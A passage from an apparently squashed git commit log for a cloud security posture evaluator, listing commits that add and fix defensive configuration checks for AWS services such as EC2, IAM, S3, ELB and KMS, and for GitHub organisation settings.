method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\n* Fix sensitive instances tags not present issue\r\n\r\n* Add env variable for per region max cpu count limit\r\n\r\n* Add empty response check in nearing regional limit for e-IP test\r\n\r\n* Add is exists check i aws config not enabled for all region test\r\n\r\n* Check ::\/0 in IP range\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Blocking pattern parameter added (#106)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#108)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\n* Fix sensitive instances tags not present issue\r\n\r\n* Add env variable for per region max cpu count limit\r\n\r\n* Add empty response check in nearing regional limit for e-IP test\r\n\r\n* Add is exists check i aws config not enabled for all region test\r\n\r\n* Check ::\/0 in IP range\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc (#90)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc\r\n\r\n* add try block\r\n\r\n* remove try (#91)\r\n\r\n* remove event loop.close() (#92)\r\n\r\n* Auto posture evaluator\/kms antstack (#62)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add key rotation status validation\r\n\r\n* Add kms cmk pending deletion check\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/ebs antstack (#64)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Added ebs tests\r\n\r\n* Add checks for snapshot and kms key encryption\r\n\r\n* Remove print statement and change recent snapshot duration from 14 to 7 days\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Delete iam_tester.py\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Sqs-Tester Tasks added (#93)\r\n\r\n* Feature\/update modle (#96)\r\n\r\n* Update the model (__init__py) and the auto_posture_evaluator- execution_id, provider and service was moved to the context and the private_key was removed from the context.\r\n\r\n* remove tmp folder\r\n\r\n* Add protodep.toml file and remove unnecessary code\r\n\r\n* SES Tester empty object condition check added. (#98)\r\n\r\n* Auto posture evaluator\/s3 antstack (#67)\r\n\r\n* Add check for bucket logging\r\n\r\n* Add check for bucket encryption with cmk\r\n\r\n* Add check for block public access setting\r\n\r\n* Add check for bucket public access configuration\r\n\r\n* Add checks for ACL permissions and small fixes\r\n\r\n* Add account id as item in return statement for a function\r\n\r\n* Add checks for bucket had global list, put or get permissions through bucket policy\r\n\r\n* Add start and end time for each tester (#100)\r\n\r\n* DMS Tester Tasks added. (#97)\r\n\r\n* Auto posture evaluator\/iam antstack (#61)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add server certificate expire in 30 days\r\n\r\n* Add expired server certificates removed\r\n\r\n* Add passwords expire in 90 days test\r\n\r\n* Add condition checks for password policy\r\n\r\n* small fix\r\n\r\n* Add check for AWS support role exists\r\n\r\n* Add check for user with admin access\r\n\r\n* Add password policy reuse test\r\n\r\n* Add check for root account's access key\r\n\r\n* Add mfa enabled for all IAM users test\r\n\r\n* Add role uses trusted principals test\r\n\r\n* Fix h\/w MFA enabled for root account\r\n\r\n* Add access keys are not created for IAM user\r\n\r\n* Add check for policy with admin privileges\r\n\r\n* Add NoSuchEntityException in password has 14 or more char check\r\n\r\n* Add NoSuchEntiry exception in password expires in 90 days test\r\n\r\n* Add NoSuchEntity exception in password requires lowercase test\r\n\r\n* Add NoSuchEntity exception for password requires uppercase test\r\n\r\n* Add NoSuchEntity exception in password requires symbols test\r\n\r\n* Add NoSuchEntity exception in password policy requires numbers test\r\n\r\n* Add NoSuchEntity exception in password reuse test\r\n\r\n* Add small fixes\r\n\r\n* Add iam user credentials unused for 45 days test\r\n\r\n* Use constant for password max age 90 days test\r\n\r\n* Use constant in password maximum length test\r\n\r\n* Use constant in access keys rotated every 90 days test\r\n\r\n* Fix server certificate issue\r\n\r\n* Add IAM user has more than one active access key test\r\n\r\n* Add IAM access analyzer disabled test\r\n\r\n* Remove item from result when there isn't any resource\r\n\r\n* Add pre heartbleed bug server certificates check\r\n\r\n* Bug fix\r\n\r\n* Add there is atleast one IAM user with access keys test\r\n\r\n* Add detect IAM users present test\r\n\r\n* Add helper method to get all the IAM users\r\n\r\n* Add helper method to get response structure\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Move the test list to env (#102)\r\n\r\n* Move the test list to env\r\n\r\n* Check tester real path. test all tester when no env\r\n\r\n* Change the exeption message\r\n\r\n* return statement added for a function (#103)\r\n\r\n* Auto posture evaluator\/elb antstack (#76)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* Add ELBv1 cross zone load balancing enabled test\r\n\r\n* Add ELBv1 connection draining enabled test\r\n\r\n* Add no registered instances in an ELBv1 test\r\n\r\n* Add ELBv1 should allow TLSv1.2 higher test\r\n\r\n* Fix typo\r\n\r\n* Add check for IAM certificate for ALB certificate should be renewed in 30 days\r\n\r\n* Remove response item in result when there isn't any ELB\r\n\r\n* Add pagination in describe LB to get all LBs\r\n\r\n* Add ELBv1 SSL certificate expires in 90 days test\r\n\r\n* Add env variable for SSL certificate expiry test\r\n\r\n* Add small fix\r\n\r\n* Add ELB SSL certificate should be renewed 5 days in advance test\r\n\r\n* Add ELB supports vulnerable negotiation policy test\r\n\r\n* first commit (#104)\r\n\r\n* Blocking pattern parameter added (#106)\r\n\r\n* Add tcp port 138 for netbios test\r\n\r\n* Add udp port 139 for netbios test\r\n\r\n* Add icmpv6 in icmp access test\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Add cloudwatch tester (#70)\r\n\r\n* Add cloudwatch tester\r\n\r\n* Add multiple check for alarms present in cloudwatch\r\n\r\n* Add more cloudwatch checks and one cloudformation check for stack notifications\r\n\r\n* Add small fix\r\n\r\n* Add item to results\r\n\r\n* removed unnecessary line\r\n\r\n* Add result object helper method\r\n\r\n* item name changed to cloudformation_stack name in unauthorized api calls not monitored\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* fix protodep.toml typo (#105)\r\n\r\n* Cloud Trail Tasks are added (#112)\r\n\r\n* SNS Tester task added. (#111)\r\n\r\n* Auto posture evaluator\/elasticbeanstalk antstack (#79)\r\n\r\n* Add application env should have elb access log enabled test\r\n\r\n* Fix small issue\r\n\r\n* Add enhanced health reporting enabled test\r\n\r\n* Fix enhanced health reporting check\r\n\r\n* Add only active env for enhanced health reporting enabled test\r\n\r\n* Add application env has managed updates enabled test\r\n\r\n* Add helper function to form return items\r\n\r\n* Add environemnt notification is configured test\r\n\r\n* Add helper method to get all the environments\r\n\r\n* Fix application loadbalancer has access logs test\r\n\r\n* Auto posture evaluator\/GitHub antstack (#53)\r\n\r\n* Add check for 2fa auth enforced\r\n\r\n* Add check for base permission not set to admin\r\n\r\n* Add check for members can not create public repo\r\n\r\n* Add check for organization's domain is not verified\r\n\r\n* Add check for github pages disabled\r\n\r\n* Add check for members without gpg keys\r\n\r\n* Add check for code security alerts enabled\r\n\r\n* Add no outside collaborators with admin permissions\r\n\r\n* Add check for pending invitations for outside collaborators\r\n\r\n* Replaced base url string with constants\r\n\r\n* Add check for deploy keys are fresh\r\n\r\n* Fix typo in method name\r\n\r\n* Add check for sso enabled\r\n\r\n* Add check for repositories monitored for vulnerabilities\r\n\r\n* Add check for outside collaborators don't have admin permissions\r\n\r\n* Add check for 3rd party apps with pull request write permissions\r\n\r\n* Remove redundant loop execution in GPG key check\r\n\r\n* Remove debug print function\r\n\r\n* Use site_admin for no outside collaborators with admin permission check\r\n\r\n* Add helper method for pagination\r\n\r\n* Add pagination in no outside collaborator admin check\r\n\r\n* Fix api string for better readability\r\n\r\n* Add pagination in github pages disabled test\r\n\r\n* Add pagination in memmers without gpg keys test\r\n\r\n* Add pagination in deploy key fresh check\r\n\r\n* Fix deploy keys fresh check\r\n\r\n* Add pagination in outside collaborator with admin\r\n\r\n* Fix third party apps with pull request write test\r\n\r\n* Add evidence repositories list public test\r\n\r\n* Fix pagination in members without gpg keys check\r\n\r\n* Fix outside collaborators with admin permission pagination\r\n\r\n* Add no vulnerabilities found repo test\r\n\r\n* Fix pending invitation with admin permission test\r\n\r\n* Fix all repo monitored for code scanning\r\n\r\n* Fix users without MFA\r\n\r\n* Fix default repo permissions NoneType issue\r\n\r\n* Use status code for users without MFA check\r\n\r\n* Modify get paginated to consider status code of response\r\n\r\n* Add status code in github pages disabled\r\n\r\n* Modify member without GPG keys for status code\r\n\r\n* Modify pending admin invitations to consder status code\r\n\r\n* Modify deploy key freshness check to consider status code\r\n\r\n* Modify all repo monitored for code vulnerabilities\r\n\r\n* Use status code in evidence repo is public\r\n\r\n* Modify vulnerabilities found on repo to consider status code\r\n\r\n* Add HTTP status code in no outside collaborator with admin test\r\n\r\n* Use HTTP status code in code security alerts are enabled test\r\n\r\n* Add HTTP 404 case for vulnerabilities fouund on repo test\r\n\r\n* Add HTTP 404 case in evidence repos are public\r\n\r\n* Add HTTP 404 case in sso enabled test\r\n\r\n* Add HTTP 404 case in deploy keys are fresh test\r\n\r\n* Add HTTP 404 case in repos monitored for code vulnerabilities test\r\n\r\n* Add HTTP 404 case in members without GPG keys test\r\n\r\n* Add HTTP 404 in github pages disabled test\r\n\r\n* Add HTTP 404 case in org domain not verified test case\r\n\r\n* Add HTTP 404 case in member can create public repo test\r\n\r\n* Add HTTP 404 case in base permission not admin test\r\n\r\n* Add HTTP 404 case 2fa auth enforced test case\r\n\r\n* Fix forable repositories test\r\n\r\n* Add HTTP 404 check too many admin user test\r\n\r\n* Fix third aprty app with write permissions test\r\n\r\n* Fix Deply keys are fresh result\r\n\r\n* Remove debug print function\r\n\r\n* Add small fix\r\n\r\n* Remove result item when there isn't any resource we are looking for\r\n\r\n* Remove not owner item from response\r\n\r\n* Remove unnecessary imports\r\n\r\n* Add personal access token validation\r\n\r\n* Add constant for max number of admin users\r\n\r\n* Fix pending invitations with admin permissions test\r\n\r\n* Remove the other status code check\r\n\r\n* Fix 2fa enforced test\r\n\r\n* Fix members can create publi repo test\r\n\r\n* Fix deploy keys are fresh test\r\n\r\n* Add get method to get is_verified\r\n\r\n* Remove forbidden@@<org> from outside collaborators with admin permission test\r\n\r\n* Remove unused variables\r\n\r\n* Cloudfront Tester Tasks added. (#110)\r\n\r\n* Prefix keyword 'aws' for all sns tester functions (#123)\r\n\r\n* Prefix 'aws' added for all ses tester functions (#121)\r\n\r\n* Elastic Cache Cluster Node check condition added (#122)\r\n\r\n* Prefix aws key word added for all tests (#120)\r\n\r\n* Prefix added for Cloudfront Tester functions. (#124)\r\n\r\n* Prefix added for SQS Tester functions. (#130)\r\n\r\n* Prefix added for route 53 tester functions. (#129)\r\n\r\n* Prefix added for Redshift Tester functions. (#128)\r\n\r\n* Prefix added for DMS Tester functions (#126)\r\n\r\n* Prefix added for all Cloudtrail functions (#125)\r\n\r\n* Prefix added for EBS Tester functions. (#127)\r\n\r\n* Auto posture evaluator\/s3 antstack (#117)\r\n\r\n* Add check for bucket logging\r\n\r\n* Add check for bucket encryption with cmk\r\n\r\n* Add check for block public access setting\r\n\r\n* Add check for bucket public access configuration\r\n\r\n* Add checks for ACL permissions and small fixes\r\n\r\n* Add account id as item in return statement for a function\r\n\r\n* Add checks for bucket had global list, put or get permissions through bucket policy\r\n\r\n* Add or instead of and in block public access disabled test\r\n\r\n* Restriction check for topic,subscription and encryption functions are done (#63)\r\n\r\nElastic Search Tester cases - Latest Engine Version,Using VPC,Encryption enabled,KMS CMK - Done\r\n\r\n* Elastic Search Tester cases - Latest Engine Version,Using VPC,Encryption enabled,KMS CMK - Done (#58)\r\n\r\nElastic Search -  Not publicly accessible\r\n\r\n* SQS - Tester file added (#65)\r\n\r\n* SQS - Tester file added\r\n\r\n* Fixes in the Sqs testers\r\n\r\n* Auto posture evaluator\/elb antstack (#66)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* add grpc endpoint (#71)\r\n\r\n* add grpc endpoint\r\n\r\n* change execution_id\r\n\r\n* add model folder to the package_generator.sh\r\n\r\n* change the return value of logger method and chnge the README file\r\n\r\n* remove await\r\n\r\n* remove readme\r\n\r\n* Removing the coralogix (old) endpoint\r\n\r\n* Change raise exception to print an continue\r\n\r\n* delete package folder in the beginning\r\n\r\n* Remove exception in case the Result list is empty (#86)\r\n\r\n* Add neptune cluster tests (#82)\r\n\r\n* Add neptune cluster tests\r\n\r\n* Fix neptune cluster audit log issue\r\n\r\n* fix uuid - to generate uuid4() (#87)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc (#90)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc\r\n\r\n* add try block\r\n\r\n* remove try (#91)\r\n\r\n* remove event loop.close() (#92)\r\n\r\n* Auto posture evaluator\/kms antstack (#62)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add key rotation status validation\r\n\r\n* Add kms cmk pending deletion check\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/ebs antstack (#64)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Added ebs tests\r\n\r\n* Add checks for snapshot and kms key encryption\r\n\r\n* Remove print statement and change recent snapshot duration from 14 to 7 days\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Delete iam_tester.py\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Sqs-Tester Tasks added (#93)\r\n\r\n* Feature\/update modle (#96)\r\n\r\n* Update the model (__init__py) and the auto_posture_evaluator- execution_id, provider and service was moved to the context and the private_key was removed from the context.\r\n\r\n* remove tmp folder\r\n\r\n* Add protodep.toml file and remove unnecessary code\r\n\r\n* SES Tester empty object condition check added. (#98)\r\n\r\n* Add start and end time for each tester (#100)\r\n\r\n* DMS Tester Tasks added. (#97)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#69)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/iam antstack (#61)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add server certificate expire in 30 days\r\n\r\n* Add expired server certificates removed\r\n\r\n* Add passwords expire in 90 days test\r\n\r\n* Add condition checks for password policy\r\n\r\n* small fix\r\n\r\n* Add check for AWS support role exists\r\n\r\n* Add check for user with admin access\r\n\r\n* Add password policy reuse test\r\n\r\n* Add check for root account's access key\r\n\r\n* Add mfa enabled for all IAM users test\r\n\r\n* Add role uses trusted principals test\r\n\r\n* Fix h\/w MFA enabled for root account\r\n\r\n* Add access keys are not created for IAM user\r\n\r\n* Add check for policy with admin privileges\r\n\r\n* Add NoSuchEntityException in password has 14 or more char check\r\n\r\n* Add NoSuchEntiry exception in password expires in 90 days test\r\n\r\n* Add NoSuchEntity exception in password requires lowercase test\r\n\r\n* Add NoSuchEntity exception for password requires uppercase test\r\n\r\n* Add NoSuchEntity exception in password requires symbols test\r\n\r\n* Add NoSuchEntity exception in password policy requires numbers test\r\n\r\n* Add NoSuchEntity exception in password reuse test\r\n\r\n* Add small fixes\r\n\r\n* Add iam user credentials unused for 45 days test\r\n\r\n* Use constant for password max age 90 days test\r\n\r\n* Use constant in password maximum length test\r\n\r\n* Use constant in access keys rotated every 90 days test\r\n\r\n* Fix server certificate issue\r\n\r\n* Add IAM user has more than one active access key test\r\n\r\n* Add IAM access analyzer disabled test\r\n\r\n* Remove item from result when there isn't any resource\r\n\r\n* Add pre heartbleed bug server certificates check\r\n\r\n* Bug fix\r\n\r\n* Add there is atleast one IAM user with access keys test\r\n\r\n* Add detect IAM users present test\r\n\r\n* Add helper method to get all the IAM users\r\n\r\n* Add helper method to get response structure\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Move the test list to env (#102)\r\n\r\n* Move the test list to env\r\n\r\n* Check tester real path. test all tester when no env\r\n\r\n* Change the exeption message\r\n\r\n* return statement added for a function (#103)\r\n\r\n* Auto posture evaluator\/elb antstack (#76)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* Add ELBv1 cross zone load balancing enabled test\r\n\r\n* Add ELBv1 connection draining enabled test\r\n\r\n* Add no registered instances in an ELBv1 test\r\n\r\n* Add ELBv1 should allow TLSv1.2 higher test\r\n\r\n* Fix typo\r\n\r\n* Add check for IAM certificate for ALB certificate should be renewed in 30 days\r\n\r\n* Remove response item in result when there isn't any ELB\r\n\r\n* Add pagination in describe LB to get all LBs\r\n\r\n* Add ELBv1 SSL certificate expires in 90 days test\r\n\r\n* Add env variable for SSL certificate expiry test\r\n\r\n* Add small fix\r\n\r\n* Add ELB SSL certificate should be renewed 5 days in advance test\r\n\r\n* Add ELB supports vulnerable negotiation policy test\r\n\r\n* first commit (#104)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#107)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\n* Fix sensitive instances tags not present issue\r\n\r\n* Add env variable for per region max cpu count limit\r\n\r\n* Add empty response check in nearing regional limit for e-IP test\r\n\r\n* Add is exists check i aws config not enabled for all region test\r\n\r\n* Check ::\/0 in IP range\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Blocking pattern parameter added (#106)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#108)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\n* Fix sensitive instances tags not present issue\r\n\r\n* Add env variable for per region max cpu count limit\r\n\r\n* Add empty response check in nearing regional limit for e-IP test\r\n\r\n* Add is exists check i aws config not enabled for all region test\r\n\r\n* Check ::\/0 in IP range\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc (#90)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc\r\n\r\n* add try block\r\n\r\n* remove try (#91)\r\n\r\n* remove event loop.close() (#92)\r\n\r\n* Auto posture evaluator\/kms antstack (#62)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add key rotation status validation\r\n\r\n* Add kms cmk pending deletion check\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/ebs antstack (#64)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Added ebs tests\r\n\r\n* Add checks for snapshot and kms key encryption\r\n\r\n* Remove print statement and change recent snapshot duration from 14 to 7 days\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Delete iam_tester.py\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Sqs-Tester Tasks added (#93)\r\n\r\n* Feature\/update modle (#96)\r\n\r\n* Update the model (__init__py) and the auto_posture_evaluator- execution_id, 